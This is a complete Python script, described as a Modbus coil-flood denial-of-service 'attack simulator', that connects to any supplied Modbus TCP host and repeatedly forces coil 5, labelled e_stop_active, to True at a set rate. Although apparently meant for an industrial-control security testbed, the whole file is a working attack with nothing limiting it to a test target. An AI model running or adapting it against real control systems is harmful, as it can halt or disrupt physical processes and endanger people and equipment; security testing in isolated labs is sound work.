#!/usr/bin/env python3
"""
Modbus Coil Flood (DoS) attack simulator.
Writes True to Coil 5 (e_stop_active) at a high rate.
"""
from __future__ import annotations
import argparse
import sys
import time
from pymodbus.client import ModbusTcpClient

def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument('--host', required=True)
    p.add_argument('--port', type=int, default=502)
    p.add_argument('--duration-s', type=float, default=10.0)
    p.add_argument('--rate-hz', type=float, default=10.0)
    args = p.parse_args()

    client = ModbusTcpClient(host=args.host, port=args.port, timeout=2.0)
    if not client.connect():
        print(f"Cannot connect to {args.host}:{args.port}")
        return 1

    period = 1.0 / args.rate_hz
    start = time.monotonic()
    while (time.monotonic() - start) < args.duration_s:
        t0 = time.monotonic()
        try:
            client.write_coil(address=5, value=True)
        except Exception as exc:
            print(f"Write failed: {exc}")
        sleep_t = period - (time.monotonic() - t0)
        if sleep_t > 0:
            time.sleep(sleep_t)
    client.close()
    return 0

if __name__ == '__main__':
    sys.exit(main())
